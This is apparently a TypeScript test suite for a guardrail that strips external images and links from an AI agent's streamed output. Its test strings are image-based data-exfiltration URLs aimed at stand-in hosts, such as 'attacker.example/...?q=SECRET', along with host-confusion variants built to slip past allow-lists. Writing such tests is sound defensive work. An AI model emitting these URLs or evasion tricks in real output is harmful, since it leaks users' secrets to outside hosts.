import { describe, expect, it } from "vitest";
import { agent } from "../../agent/agent";
import type { StreamEvent } from "../../contracts/stream/stream-event.type";
import { MockModel } from "../../mock/mock-model";
import type { GuardrailDetectorContext, GuardrailVerdict } from "../contracts";
import { guard } from "../guard";
import { links } from "./links";

const ctx = { phase: "output" } as unknown as GuardrailDetectorContext;

function redacted(verdict: GuardrailVerdict): string {
  if (verdict.type !== "redact") {
    throw new Error(`expected a redact verdict, got ${verdict.type}`);
  }

  return verdict.text;
}

describe("links detector", () => {
  it("strips an external Markdown image and keeps its alt text", () => {
    const verdict = links().check(
      "Done. ![chart](https://attacker.example/c.png?q=SECRET) See above.",
      ctx,
    );

    expect(redacted(verdict)).toBe("Done. chart See above.");
  });

  it("keeps images on an allowed host and relative images", () => {
    const text =
      "![a](https://cdn.example.com/a.png) ![b](/img/b.png) ![c](https://img.example.org/c.png)";
    const verdict = links({ allowHosts: ["cdn.example.com", "*.example.org"] }).check(text, ctx);

    expect(verdict).toEqual({ type: "allow" });
  });

  it("strips an image with a title and angle-bracket destination", () => {
    const text =
      'x ![a](<https://evil.example/a b.png> "t") y ![b](https://evil.example/b "title") z';

    expect(redacted(links().check(text, ctx))).toBe("x a y b z");
  });

  it("refuses URLs a renderer could decode into another host", () => {
    const tricky = [
      "![a](https://ok.example&sol;@evil.example/x)",
      "![a](https:\\\\evil.example/x)",
      "![a](//evil.example/x)",
      "![a](data:image/png;base64,AAAA)",
      "![a](HTTPS://EVIL.EXAMPLE/x)",
      "![a](https://ok.example@evil.example/x)",
    ];
    const detector = links({ allowHosts: ["ok.example"] });

    for (const text of tricky) {
      expect(detector.check(text, ctx).type, text).toBe("redact");
    }
  });

  it("strips an HTML <img> (src and srcset) and keeps its alt text", () => {
    const text =
      'a <IMG alt="logo" SRC="https://evil.example/p.png?d=1"> b <img srcset="/ok.png 1x, https://evil.example/2.png 2x" alt=\'two\'> c';

    expect(redacted(links().check(text, ctx))).toBe("a logo b two c");
  });

  it("strips <image> tags, which HTML parsers read as <img> and SVG loads by href", () => {
    const text =
      'a <image src="https://evil.example/1.png"> b <svg><image href="https://evil.example/2.png"/></svg> c';
    const output = redacted(links().check(text, ctx));

    expect(output).not.toContain("evil.example");
    expect(links().check('<image src="/local.png">', ctx)).toEqual({ type: "allow" });
  });

  it("removes a reference definition that points elsewhere", () => {
    const text = "Look: ![chart][c]\n\n[c]: https://evil.example/?q=SECRET\n";

    expect(redacted(links().check(text, ctx))).not.toContain("evil.example");
  });

  it("leaves links alone by default and strips them with links: true", () => {
    const text =
      'Read [the guide](https://evil.example/?q=1), <a href="https://evil.example">here</a> or <https://evil.example/x>.';

    expect(links().check(text, ctx)).toEqual({ type: "allow" });
    expect(redacted(links({ links: true }).check(text, ctx))).toBe("Read the guide, here</a> or .");
  });

  it("strips an image nested inside a link in one rewrite", () => {
    const text = "[![img](https://evil.example/a.png)](https://evil.example/b)";

    expect(redacted(links({ links: true }).check(text, ctx))).toBe("img");
  });

  it("treats an escaped image marker as a link", () => {
    expect(links().check("\\![a](https://evil.example/x)", ctx)).toEqual({ type: "allow" });
  });

  it("blocks or flags instead of rewriting when asked", () => {
    const text = "![a](https://evil.example/x)";

    expect(links({ onMatch: "block" }).check(text, ctx)).toMatchObject({
      type: "block",
      matches: [{ rule: "links.image", span: [0, text.length - 1] }],
    });
    expect(links({ onMatch: "flag" }).check(text, ctx).type).toBe("flag");
  });

  it("returns on large adversarial input", () => {
    const inputs = [
      "![".repeat(100_000),
      "[a](".repeat(100_000),
      "<img ".repeat(100_000),
      "[x\n".repeat(100_000),
      "![a](<".repeat(100_000),
      // Unclosed `(` titles: each one used to rescan the rest of the text.
      "[a](x (".repeat(100_000),
    ];

    for (const input of inputs) {
      expect(["allow", "redact", "block"]).toContain(links({ links: true }).check(input, ctx).type);
    }
  });
});

describe("links detector on a streaming run", () => {
  it("never streams the external image URL", async () => {
    const model = new MockModel("mock", [
      {
        content: "Here ![x](https://evil.example/?q=SECRET) done",
        deltas: ["Here ![x](https://evil", ".example/?q=SECRET) done"],
        finishReason: "stop",
      },
    ]);
    const stream = agent({ model, middleware: [guard({ output: [links()] })] }).stream("hi");
    const deltas: string[] = [];

    for await (const event of stream as AsyncIterable<StreamEvent>) {
      if (event.type === "agent.trip.streaming") deltas.push(event.delta);
    }

    expect(deltas).toEqual(["Here x done"]);
  });
});
